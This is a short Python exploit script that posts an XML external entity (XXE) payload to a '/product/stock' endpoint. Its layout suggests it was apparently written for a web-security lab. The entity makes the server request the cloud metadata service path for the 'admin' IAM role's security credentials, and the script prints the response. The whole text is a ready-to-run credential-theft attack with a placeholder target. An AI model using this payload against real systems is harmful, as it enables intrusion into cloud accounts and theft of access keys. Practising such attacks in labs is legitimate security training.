import requests

target_url="YOUR_HOST"

path="/product/stock"
headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/xml"
}

data_payload = '''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
'''.strip()

res=requests.post(target_url+path, headers=headers, data=data_payload)

print(res.status_code)
print(res.text)